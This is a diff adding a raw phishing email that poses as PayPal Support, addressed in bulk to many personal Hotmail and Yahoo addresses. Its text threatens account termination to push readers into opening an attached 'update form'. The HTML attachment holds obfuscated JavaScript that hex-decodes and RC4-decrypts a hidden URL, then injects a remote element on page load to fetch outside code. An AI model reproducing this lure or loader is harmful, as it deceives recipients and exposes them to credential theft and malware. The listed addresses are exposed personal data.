@@ -1,0 +1,96 @@
+Content-Type: multipart/mixed; boundary="===============4490356988639791893=="
+MIME-Version: 1.0
+From: PayPal Support <security956@safety.org>
+Message-Id: <619010c4bf1b09d058b16aedb87f70df@8vYjQ9978D.net>
+Subject: Keep your information current
+To: sol_gonzagro@hotmail.com
+ sol_glz92@hotmail.com; sol_godie1303@hotmail.com; sol_godoym@hotmail.com;
+ sol_gois@hotmail.com; sol_gomes10@hotmail.com; sol_gomes1@hotmail.com;
+ sol_gomes69@hotmail.com; sol_gomez@hotmail.com; sol_gomez@yahoo.com;
+ sol_gomez_salazar@hotmail.com; sol_gonzaga@hotmail.com;
+ sol_gonzagro@hotmail.com; sol_gordis@hotmail.com; sol_gorostiaga@hotmail.com;
+ sol_grace@yahoo.com; sol_graciano@hotmail.com; sol_granados@hotmail.com;
+ sol_greener@yahoo.com; sol_gregol@hotmail.com; sol_gribeiro@hotmail.com;
+ sol_grimaldi@hotmail.com; sol_groba@hotmail.com; sol_grove@hotmail.com;
+ sol_gsm@hotmail.com; sol_gt.linda@hotmail.com; sol_gtr@hotmail.com;
+ sol_guedes_costa@hotmail.com
+X-Mailer: RMM
+
+--===============4490356988639791893==
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+Dear PayPal User,
+
+PayPal focuses on online transactions, and our users safety has always been our major concern.
+
+We have seen some outdated or missing information in your account, this raises security concerns
+when other users are trying to conduct any transactions with you.
+
+We ask that you provide an update of information for your account. This ensures that your information
+stays current and it also reduces the possibility of terminating your account in the future. Furthermore,
+PayPal may terminate an account when some of its account information appears to be invalid.
+
+To update your account information, please complete the update form. It's attached in the email for you
+to open in your browser.
+
+We'll notify you if we need further information. Please get this resolved today.
+--===============4490356988639791893==
+MIME-Version: 1.0
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="utf-8">
+<script>
+
+function okfyzs(my9na26)
+{
+    var wq1828p = 0;
+    var x1a6 = '';
+    if( my9na26.substr(0,2) == '0x' ){ wq1828p = 2; }
+    if( typeof my9na26 != 'string' ){ my9na26 = my9na26.toString(); }
+    for(var zjk4ip6=wq1828p;  zjk4ip6<my9na26.length; zjk4ip6+=2) {
+        var c = my9na26.substr( zjk4ip6, 2 );
+        x1a6 = x1a6 + String.fromCharCode( parseInt(c, 16) );
+        }
+    return x1a6;
+}
+
+function y10dcp7(iw235owrn, nmjq43) {
+  var u49t25, pj108, l8pv1, n7jk88, n0s91, v6001;
+  for (u49t25 = [], pj108 = 0, n7jk88 = "", n0s91 = 0; n0s91 < 256; n0s91++) u49t25[n0s91] = n0s91;
+  for (n0s91 = 0; n0s91 < 256; n0s91++)
+    pj108 = (pj108 + u49t25[n0s91] + nmjq43.charCodeAt((n0s91 % nmjq43.length))) % 256,
+    l8pv1 = u49t25[n0s91],
+    u49t25[n0s91] = u49t25[pj108],
+    u49t25[pj108] = (l8pv1);
+  for (n0s91 = 0, pj108 = 0, v6001 = 0; v6001 < iw235owrn.length; v6001++)
+    n0s91 = ((n0s91 + 1) % 256),
+    pj108 = ((pj108 + u49t25[n0s91]) % 256),
+    l8pv1 = u49t25[n0s91],
+    u49t25[n0s91] = u49t25[pj108],
+    u49t25[pj108] = l8pv1,
+    n7jk88 += String.fromCharCode(iw235owrn.charCodeAt(v6001) ^ u49t25[(u49t25[n0s91] + u49t25[pj108]) % 256]);
+  return n7jk88
+}
+</script>
+</head>
+
+<body><script>
+
+var rvd8knh = y10dcp7(okfyzs("ef93c1e392168d440e59b4d28a21a7821ff251dc62641ee66086a5fe19013151fe76fcd52ba5139b3f12b7c0532eb6cb87a8593ecb97d766f8481f"),"io1ab55i");
+var n7ed = y10dcp7(okfyzs("f484c7fad84d"),"io1ab55i");
+var ik08sgi3f = document.createElement(n7ed);
+ik08sgi3f.src = rvd8knh;
+var sk58c2 = y10dcp7(okfyzs("ef82d4f7"),"io1ab55i");
+document.getElementsByTagName(sk58c2)[0].appendChild(ik08sgi3f);
+</script>
+
+</body>
+</html>
+--===============4490356988639791893==--
